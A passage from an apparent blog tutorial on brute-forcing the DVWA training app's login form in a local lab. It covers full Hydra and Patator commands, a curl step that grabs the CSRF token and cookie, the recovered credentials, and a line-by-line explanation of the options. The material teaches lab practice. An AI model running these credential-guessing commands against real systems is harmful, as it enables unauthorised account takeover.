&lt;/span&gt;&lt;span class="line"&gt;admin
&lt;/span&gt;&lt;span class="line"&gt;1337
&lt;/span&gt;&lt;span class="line"&gt;gordonb
&lt;/span&gt;&lt;span class="line"&gt;pablo
&lt;/span&gt;&lt;span class="line"&gt;smithy
&lt;/span&gt;&lt;span class="line"&gt;EOF
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# time  hydra  -L /root/users.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -u -t &lt;span class="m"&gt;2&lt;/span&gt;  -w &lt;span class="m"&gt;15&lt;/span&gt;  -v  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-23 10:27:36
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;2&lt;/span&gt; tasks per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;19795&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:5/p:3959&lt;span class="o"&gt;)&lt;/span&gt;, ~154 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: smithy   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: gordonb   password: abc123
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; 1569.00 tries/min, &lt;span class="m"&gt;1569&lt;/span&gt; tries in 00:01h, &lt;span class="m"&gt;18226&lt;/span&gt; todo in 00:12h, &lt;span class="m"&gt;2&lt;/span&gt; active
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: pablo   password: letmein
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; 2490.67 tries/min, &lt;span class="m"&gt;7472&lt;/span&gt; tries in 00:03h, &lt;span class="m"&gt;12323&lt;/span&gt; todo in 00:05h, &lt;span class="m"&gt;2&lt;/span&gt; active
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-get-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.44   login: &lt;span class="m"&gt;1337&lt;/span&gt;   password: charley
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.44 &lt;span class="o"&gt;(&lt;/span&gt;waiting &lt;span class="k"&gt;for&lt;/span&gt; children to finish&lt;span class="o"&gt;)&lt;/span&gt; ...
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;5&lt;/span&gt; valid passwords found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-23 10:32:16
&lt;/span&gt;&lt;span class="line"&gt;hydra -L /root/users.txt -P /usr/share/seclists/Passwords/rockyou-40.txt -e n  1.45s user 4.06s system 1% cpu 4:39.34 total
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Multiple Users Hydra" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-15.png" /&gt;&lt;/p&gt;

&lt;p&gt;A few comments when using hydra in multiple user mode:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Once Hydra finds the last credential to brute force, it will quit.&lt;/li&gt;
&lt;li&gt;I also found when doing any more than 3 threads, once the last user account was cracked, all but one process thread would finish and the remaining one would start to increase CPU usage (it also stopped sending out requests).&lt;/li&gt;
&lt;li&gt;It is using whitelisting rather than blacklisting.&lt;/li&gt;
&lt;li&gt;Could not use &lt;code&gt;:S=Content-Length\: 5007&lt;/code&gt; as the page length if it was a successful login as the page will be a different sized based on the username who logged in. Hydra does not support maths functions to say less than or greater than (currently in v8.1).&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="L.strong.Patator..strong."&gt;&lt;/a&gt;
&lt;h2&gt;&lt;strong&gt;Patator&lt;/strong&gt;&lt;/h2&gt;

&lt;a name="Patator.Documentation"&gt;&lt;/a&gt;
&lt;h3&gt;Patator Documentation&lt;/h3&gt;

&lt;p&gt;Patator is not as well-known as either Hydra, Medusa, Ncrack, Metasploit, or Nmap probably due to the it being the "youngest" tool (In November 2011 v0.1 was released publicly).&lt;/p&gt;

&lt;p&gt;Quoting the README file: &lt;em&gt;"&lt;strong&gt;Patator is NOT script-kiddie friendly, please read the README inside patator.py before reporting.&lt;/strong&gt;"&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Patator is incredibly powerful. It is written in python, rather than C (which makes Patator use more system resources), however, it makes up for this as it has an it has an awful lot more features and options. It is not straightforward to use, and there is limited documentation for it. But I personally find it is worth investing the time to use it =).&lt;/p&gt;

&lt;p&gt;Once again, let us read up, what does what, and think about what we need.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;patator
&lt;/span&gt;&lt;span class="line"&gt;patator http_fuzz --help
&lt;/span&gt;&lt;span class="line"&gt;*patator comments &lt;span class="o"&gt;(&lt;/span&gt;all in the header at the top&lt;span class="o"&gt;)&lt;/span&gt;*.
&lt;/span&gt;&lt;span class="line"&gt;*patator &lt;span class="nb"&gt;source &lt;/span&gt;code*.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;The README also states to check the comments in the code (there is some unique information located here). I also found checking the actual source code to be helpful as it gave me a better understanding. It is written in Python, which makes it easier to understand.&lt;/p&gt;

&lt;p&gt;Offline: &lt;code&gt;less $(which patator)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Online: &lt;a href="https://github.com/lanjelot/patator/"&gt;https://github.com/lanjelot/patator/&lt;/a&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;url                : main url to target &lt;span class="o"&gt;(&lt;/span&gt;scheme://host&lt;span class="o"&gt;[&lt;/span&gt;:port&lt;span class="o"&gt;]&lt;/span&gt;/path?query&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;body               : body data
&lt;/span&gt;&lt;span class="line"&gt;header             : use custom headers
&lt;/span&gt;&lt;span class="line"&gt;method             : method to use &lt;span class="o"&gt;[&lt;/span&gt;GET &lt;span class="p"&gt;|&lt;/span&gt; POST &lt;span class="p"&gt;|&lt;/span&gt; HEAD &lt;span class="p"&gt;|&lt;/span&gt; ...&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;follow             : follow any Location redirect &lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="p"&gt;|&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;accept_cookie      : save received cookies to issue them in future requests &lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="p"&gt;|&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;http_proxy         : HTTP proxy to use &lt;span class="o"&gt;(&lt;/span&gt;host:port&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;timeout            : seconds to &lt;span class="nb"&gt;wait &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; a HTTP response &lt;span class="o"&gt;[&lt;/span&gt;20&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;--rate-limit&lt;span class="o"&gt;=&lt;/span&gt;N     : &lt;span class="nb"&gt;wait &lt;/span&gt;N seconds between tests &lt;span class="o"&gt;(&lt;/span&gt;default is 0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;-t N, --threads&lt;span class="o"&gt;=&lt;/span&gt;N  : number of threads &lt;span class="o"&gt;(&lt;/span&gt;default is 10&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;-x arg             : actions and conditions, see Syntax below
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;actions            :&lt;span class="o"&gt;=&lt;/span&gt; action&lt;span class="o"&gt;[&lt;/span&gt;,action&lt;span class="o"&gt;]&lt;/span&gt;*
&lt;/span&gt;&lt;span class="line"&gt;action             :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ignore&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;retry&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;free&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;quit&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;reset&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;conditions         :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;condition&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;value&lt;span class="o"&gt;[&lt;/span&gt;,condition&lt;span class="o"&gt;=&lt;/span&gt;value&lt;span class="o"&gt;]&lt;/span&gt;*
&lt;/span&gt;&lt;span class="line"&gt;condition          :&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;code&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;size&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mesg&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;fgrep&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;egrep&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;clen&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ignore             : &lt;span class="k"&gt;do&lt;/span&gt; not report
&lt;/span&gt;&lt;span class="line"&gt;quit               : terminate execution now
&lt;/span&gt;&lt;span class="line"&gt;code               : match status code
&lt;/span&gt;&lt;span class="line"&gt;size               : match size &lt;span class="o"&gt;(&lt;/span&gt;N or N-M or N- or -N&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;mesg               : match message
&lt;/span&gt;&lt;span class="line"&gt;fgrep              : search &lt;span class="k"&gt;for&lt;/span&gt; string
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Debugging.Patator"&gt;&lt;/a&gt;
&lt;h3&gt;Debugging Patator&lt;/h3&gt;

&lt;p&gt;Patator is more verbose in its output compared to Hydra, as out of the box Patator will display all attempts made (you need to tell it to ignore requests based on a parameter). Plus, it will have various columns displaying results (which thread made the request, size of response, code response etc.), in every visible request. This helps to build up a bigger picture overall of what is going on with the attack. &lt;strong&gt;Patator has more of a "fuzzer" feel to it, rather than being a brute force tool&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Unless you tell it not to, Patator will not only do it but display the result of it and keep on doing it until instructed otherwise.&lt;/p&gt;

&lt;p&gt;For whatever reason, if the displayed output is not enough, then Patator can be put through a proxy to monitor its actions (Burp does not need to be in "Invisible Proxy Mode".&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# echo -e 'admin\n\npassword' &amp;gt; /root/password.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# patator  http_fuzz  method=GET \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/password.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;http_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.0.0.1:8080 &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;  --rate-limit&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x ignore:fgrep&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect.'&lt;/span&gt;  -x quit:fgrep!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Username and/or password incorrect.'&lt;/span&gt;,clen!&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'-1'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;18:12:40 patator    INFO - Starting Patator v0.5 &lt;span class="o"&gt;(&lt;/span&gt;http://code.google.com/p/patator/&lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-23 18:12 BST
&lt;/span&gt;&lt;span class="line"&gt;18:12:40 patator    INFO -
&lt;/span&gt;&lt;span class="line"&gt;18:12:40 patator    INFO - code size:clen     &lt;span class="p"&gt;|&lt;/span&gt; candidate                        &lt;span class="p"&gt;|&lt;/span&gt;   num &lt;span class="p"&gt;|&lt;/span&gt; mesg
&lt;/span&gt;&lt;span class="line"&gt;18:12:40 patator    INFO - ----------------------------------------------------------------------
&lt;/span&gt;&lt;span class="line"&gt;18:12:44 patator    INFO - &lt;span class="m"&gt;200&lt;/span&gt;  5276:5007     &lt;span class="p"&gt;|&lt;/span&gt; password                         &lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;span class="line"&gt;18:12:44 patator    INFO - Hits/Done/Skip/Fail/Size: 1/3/0/0/3, Avg: &lt;span class="m"&gt;0&lt;/span&gt; r/s, Time: 0h 0m 3s
&lt;/span&gt;&lt;span class="line"&gt;18:12:44 patator    INFO - To resume execution, pass --resume 3
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Debugging Patator" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-16.png" /&gt;&lt;/p&gt;

&lt;p&gt;Again, let's break down the command (also at the end, I will make a comparison between Hydra and Patator syntaxes):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;patator&lt;/code&gt; - the main program itself&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http_fuzz&lt;/code&gt; - the module to use for the method of the attack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;method=GET&lt;/code&gt; - how to send the request&lt;/li&gt;
&lt;li&gt;&lt;code&gt;url="http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=FILE0&amp;amp;Login=Login"&lt;/code&gt; - the full URL and how to use the wordlist&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0=/root/password.txt&lt;/code&gt; - defining the file for "wordlist 0" (aka password wordlist)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;header="Cookie: security=low; PHPSESSID=${SESSIONID}"&lt;/code&gt; - the cookie information to send.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http_proxy=127.0.0.1:8080&lt;/code&gt; - instructs Patator to use a proxy.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--threads=1&lt;/code&gt; - single thread&lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeout=5&lt;/code&gt;- timeout value of 5 seconds&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--rate-limit=1&lt;/code&gt; - wait 1 second before going on to the next thread&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x ignore:fgrep='Username and/or password incorrect.'&lt;/code&gt; - If it matches, do not display out. All Failed logins will contain this string (aka blacklisting)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x quit:fgrep!='Username and/or password incorrect.'&lt;/code&gt; - If it does not match this string on the page, quit.

&lt;ul&gt;
&lt;li&gt;If we wanted to use the page length instead: &lt;code&gt;-x ignore:clen=4945&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;,clen!='-1'&lt;/code&gt; - this extends the conditions required quit (AND operator). The page response length cannot be &lt;code&gt;-1&lt;/code&gt; (aka the page timed out).&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;You may have noticed, we had to create a wordlist to match the same values that were sent when using Hydra. This is because Patator does not (yet?) support Hydra's &lt;code&gt;-e nsr&lt;/code&gt; options to send a blank password, the username as the password or reverse the login.&lt;/p&gt;

&lt;p&gt;Unlike Hydra, &lt;strong&gt;Patator does NOT say "successfully logged into host: 192.168.1.44, login: admin, password: password". It is up to US to define the information we want shown&lt;/strong&gt; (or not wanted). Patator will also keep on just "going through" the wordlist(s) until it reaches the end (again, it is &lt;strong&gt;up to us to define a breaking point&lt;/strong&gt;). With this in mind, this is what we have done:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-x ignore:fgrep='Username...&lt;/code&gt; - means "do not display anything which matches this" (due to bad login)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-x quit:fgrep!='Username...&lt;/code&gt; - means "quit the attack if the page does not match" (due to successful login)

&lt;ul&gt;
&lt;li&gt;As this is a password single user brute force, it does not make too much sense to keep going as a user only has one password (normally?)&lt;/li&gt;
&lt;li&gt;This enforces why it is a fuzzer, rather than a password brute force tool (and a reason why it is harder to use).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;,clen!='-1'&lt;/code&gt; - and extend the quit condition so the content length cannot equal &lt;code&gt;-1&lt;/code&gt; (which is the value for pages that timeout).&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="L.strong.Patator.Attack.Command..strong."&gt;&lt;/a&gt;
&lt;h3&gt;&lt;strong&gt;Patator Attack Command&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Single User - admin&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
